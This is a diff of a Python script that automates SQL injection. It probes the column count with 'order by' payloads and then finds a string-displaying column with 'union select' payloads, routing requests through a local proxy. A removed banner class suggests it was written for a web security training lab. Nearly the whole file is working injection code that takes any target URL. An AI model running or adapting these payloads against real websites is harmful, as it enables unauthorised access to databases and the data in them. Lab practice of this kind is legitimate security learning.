@@ -1,13 +1,14 @@
 import sys
 import requests
 import urllib3
+from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 
 def expcols(url):
-    for i in range(1,10):
+    for i in range(1,11):
         p = "'+order+by+%s--+-" % str(i)
-        u = url  + str(i) + p
+        u = url + p
         r = requests.get(u, verify=False, proxies=proxies)
         print("Try #%s" % str(i))
         if "Internal Server Error" in r.text:
@@ -15,17 +16,22 @@ def expcols(url):
     return False
 
 def textcol(url, num_col, string):
-    path = "filter?category=Gifts"
-    for i in range(2, num_col+1):
-        string = f"'{string}'"
+    string = f"'{string}'"
+    for i in range(1, num_col+1):
         payload_list = ['null'] * num_col
         payload_list[i-1] = string
-        sql_payload = "' union select " + ','.join(payload_list) + "--"
-        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
-        res = r.text
-        if string.strip('\'') in res:
+        sql_payload = "' union select " + ','.join(payload_list) + "-- -"
+        r = requests.get(url + sql_payload, verify=False, proxies=proxies)
+
+        soup = BeautifulSoup(r.text, 'html.parser')
+        for banner in soup.find_all(class_="academyLabBanner"):
+            banner.decompose()
+
+        filtered_res = soup.get_text()
+        if string.strip('\'') in filtered_res:
             return i
     return False
+
 
 def main():
     try:
@@ -42,7 +48,7 @@ def main():
         else:
             print("fail")
     except IndexError:
-        print("Usage: %s <url>" % sys.argv[0])
+        print("Usage: %s <url> <string>" % sys.argv[0])
         sys.exit(-1)
 
 
